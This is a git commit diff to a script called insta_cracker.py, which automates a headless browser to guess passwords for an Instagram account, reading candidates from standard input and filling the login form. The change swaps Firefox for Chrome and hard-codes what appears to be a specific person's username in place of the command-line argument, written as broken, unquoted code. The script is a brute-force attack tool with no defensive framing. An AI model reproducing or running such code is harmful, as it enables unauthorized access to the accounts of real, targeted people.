c3f406ee6c388a1e11b41bb745926470267e6b5c
tarantino165 <finn31805@gmail.com>
2025-03-04 02:38:49 +0100

    Update insta_cracker.py

--- insta_cracker.py
+++ insta_cracker.py
@@ -12,13 +12,13 @@ def logInSuccess(browser):
 
 correctPassword = None
 account_username = sys.argv[1]
-with Browser('firefox', headless=True) as browser:
+with Browser('chrome', headless=True) as browser:
     browser.visit('https://www.instagram.com')
     browser.find_by_text("Log in").first.click()
     username_form = browser.find_by_name('username').first
     password_form = browser.find_by_name('password').first
     login_button = browser.find_by_text('Log in').first
-    username_form.fill(account_username)
+    username_form.fill(aliina.cecille)
     for password in sys.stdin:
         if len(password) < 6:
             print('Skipping password: ' + password)
